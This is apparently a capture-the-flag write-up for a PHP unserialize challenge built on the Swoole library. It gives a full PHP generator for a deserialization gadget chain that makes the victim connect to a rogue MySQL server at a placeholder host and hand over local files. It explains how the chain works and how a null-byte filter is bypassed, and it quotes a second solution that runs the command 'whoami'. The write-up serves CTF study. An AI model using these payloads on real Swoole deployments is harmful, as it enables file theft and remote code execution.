# swoole

make unserialize great again!

## License

AGPL License

## Solution

Run the following code in Swoole to generate the payload:
```php
<?php
function changeProperty ($object, $property, $value)
{
    $a = new ReflectionClass($object);
    $b = $a->getProperty($property);
    $b->setAccessible(true);
    $b->setValue($object, $value);
}

// Part A

$c = new \Swoole\Database\PDOConfig();
$c->withHost('ROUGE_MYSQL_SERVER');    // your rouge-mysql-server host & port
$c->withPort(3306);
$c->withOptions([
    \PDO::MYSQL_ATTR_LOCAL_INFILE => 1,
    \PDO::MYSQL_ATTR_INIT_COMMAND => 'select 1'
]);

$a = new \Swoole\ConnectionPool(function () { }, 0, '\\Swoole\\Database\\PDOPool');
changeProperty($a, 'size', 100);
changeProperty($a, 'constructor', $c);
changeProperty($a, 'num', 0);
changeProperty($a, 'pool', new \SplDoublyLinkedList());

// Part C

$d = unserialize(base64_decode('TzoyNDoiU3dvb2xlXERhdGFiYXNlXFBET1Byb3h5Ijo0OntzOjExOiIAKgBfX29iamVjdCI7TjtzOjIyOiIAKgBzZXRBdHRyaWJ1dGVDb250ZXh0IjtOO3M6MTQ6IgAqAGNvbnN0cnVjdG9yIjtOO3M6ODoiACoAcm91bmQiO2k6MDt9'));
// This's Swoole\Database\MysqliProxy
changeProperty($d, 'constructor', [$a, 'get']);

$curl = new \Swoole\Curl\Handler('http://www.baidu.com');
$curl->setOpt(CURLOPT_HEADERFUNCTION, [$d, 'reconnect']);
$curl->setOpt(CURLOPT_READFUNCTION, [$d, 'get']);

$ret = new \Swoole\ObjectProxy(new stdClass);
changeProperty($ret, '__object', [$curl, 'exec']);


$s = serialize($ret);
$s = preg_replace_callback('/s:(\d+):"\x00(.*?)\x00/', function ($a) {
    return 's:' . ((int)$a[1] - strlen($a[2]) - 2) . ':"';
}, $s);

echo $s;
echo "\n";

```

## Explaination

The only way I found which can pass arguments to function is this: https://github.com/swoole/library/blob/8eebda9cd87bf37164763b059922ab393802258b/src/core/ConnectionPool.php#L89
```php
$connection = new $this->proxy($this->constructor);
```
I checked all constructors and only MySQL is useful, so this is a challenge around Swoole and Rouge MySQL Server. This payload have something amazing parts.

### Part 1 - Rouge MySQL Server

Here's a description of this code:
```php
$c->withOptions([
    \PDO::MYSQL_ATTR_LOCAL_INFILE => 1,
    \PDO::MYSQL_ATTR_INIT_COMMAND => 'select 1'
]);
```

Let's first review the principles of Rouge MySQL Server. When the client sends a `COM_QUERY` request to the server for a SQL query, if the server returns a `Procotol::LOCAL_INFILE_Request`, the client will read the local file and send it to the server. See [https://dev.mysql.com/doc/internals/en/com-query-response.html#packet-Protocol::LOCAL_INFILE_Request](https://dev.mysql.com/doc/internals/en/com-query-response.html#packet-Protocol::LOCAL_INFILE_Request).

This means, if the MySQL client is connected but didn't send any query to the server, the client will not respond to the server's `LOCAL INFILE` request at all. There are many clients, such as the MySQL command line, will query for various parameters once connected. But PHP's MySQL client will do nothing after connection, so we need to configure the MySQL client with `MYSQL_ATTR_INIT_COMMAND` parameter and let it automatically send a SQL statement to the server after connection.

[I found a bug](https://github.com/swoole/library/issues/34) in mysqli for Swoole, it will ignores all connection parameters. So only PDO can be used here.

### Part 2 - SplDoublyLinkedList

Read the following code: https://github.com/swoole/library/blob/8eebda9cd87bf37164763b059922ab393802258b/src/core/ConnectionPool.php#L57

```php
    public function get()
    {
        if ($this->pool->isEmpty() && $this->num < $this->size) {
            $this->make();
        }
        return $this->pool->pop();
    }
    public function put($connection): void
    {
        if ($connection !== null) {
            $this->pool->push($connection);
        }
    }
```

The type of `$this->pool` is `Swoole\Coroutine\Channel`, but it can't be serialized. Fortunately, PHP have no runtime type checking for properties so we can find a serializable class which contains ``isEmpty`` ``push`` and ``pop`` method to replace it. SPL contains lots of classes look like this, you can replace `SplDoublyLinkedList` to `SplStack`, `SplQueue`, and so on.

### Part 3 - curl

Let's returning back to the payload and find the "Part C" comment. Try `$a->get()` here, it will return a `Swoole\Database\PDOPool` object. This is a connection pool, Swoole will not connect to MySQL until we try to get a connection from the pool. So we should use `$a->get()->get()` to connect to MySQL.

We have no way to call functions continuously. But check ``PDOProxy::reconnect``(https://github.com/swoole/library/blob/8eebda9cd87bf37164763b059922ab393802258b/src/core/Database/PDOProxy.php#L88):
```php
public function reconnect(): void
{
    $constructor = $this->constructor;
    parent::__construct($constructor());
}
public function parent::__construct ($constructor)
{
    $this->__object = $object;
}
public function parent::__invoke(...$arguments)
{
    /** @var mixed $object */
    $object = $this->__object;
    return $object(...$arguments);
}
```

Thats means `__object` will be changed after `reconnect`, so we should find a way to do something like this:
```php
$a->reconnect(); // Now $this->__object is PDOPool
$a->get();
```

Check curl, it allows exactly two different callbacks to be called.: https://github.com/swoole/library/blob/8eebda9cd87bf37164763b059922ab393802258b/src/core/Curl/Handler.php#L736

```php
$cb = $this->headerFunction;
if ($client->statusCode > 0) {
    $row = "HTTP/1.1 {$client->statusCode} " . Status::getReasonPhrase($client->statusCode) . "\r\n";
    if ($cb) {
        $cb($this, $row);
    }
    $headerContent .= $row;
}
// ...
if ($client->body and $this->readFunction) {
    $cb = $this->readFunction;
    $cb($this, $this->outputStream, strlen($client->body));
}
```

### Part 4 - Inaccessible properties

Check the following code:
```php
php > class A{public $b;protected $c;}
php > $b = new A();
php > var_dump(serialize($b));
php shell code:1:
string(35) "O:1:"A":2:{s:1:"b";N;s:4:"\000*\000c";N;}"
php >
```

The private/protected property name will be mangled with `\x00` by [zend_mangle_property_name](https://github.com/php/php-src/blob/34f727e63716dfb798865289c079b017812ad03b/Zend/zend_API.c#L3595). I banned `\x00`, how to bypass it?

Try the following code, it unmangled the property to make it public.

```php
$s = preg_replace_callback('/s:(\d+):"\x00(.*?)\x00/', function ($a) {
    return 's:' . ((int)$a[1] - strlen($a[2]) - 2) . ':"';
}, $s);
```

In PHP < 7.2, the unserialized object will have two properties with the same name but different visibility:
```php
php > var_dump($s);
string(32) "O:1:"A":2:{s:1:"b";N;s:1:"c";N;}"
php > var_dump(unserialize($s));
object(A)#2 (3) {
  ["b"]=>
  NULL
  ["c":protected]=>
  NULL
  ["c"]=>
  NULL
}
```

In PHP >= 7.2, PHP will handle property visibility changes. You can see this commit for detail: [Fix #49649 - Handle property visibility changes on unserialization ](https://github.com/php/php-src/commit/7cb5bdf64a95bd70623d33d6ea122c13b01113bd).

That is it.

## Unintended Solution

Come from [Nu1L](https://ctftime.org/team/19208). It has 2 tricks:

- `array_walk` can be used in object.
- `exec` is replaced by `swoole_exec` and have to use 2 `array_walk` to bypass it.

```php
```php
$o = new Swoole\Curl\Handlep("http://google.com/");
$o->setOpt(CURLOPT_READFUNCTION,"array_walk");
$o->setOpt(CURLOPT_FILE, "array_walk");
$o->exec = array('whoami');
$o->setOpt(CURLOPT_POST,1);
$o->setOpt(CURLOPT_POSTFIELDS,"aaa");
$o->setOpt(CURLOPT_HTTPHEADER,["Content-type"=>"application/json"]);
$o->setOpt(CURLOPT_HTTP_VERSION,CURL_HTTP_VERSION_1_1);

$a = serialize([$o,'exec']);
echo str_replace("Handlep","Handler",urlencode(process_serialized($a)));


// process_serialized:
// use `S:` instead of `s:` to bypass \x00
```
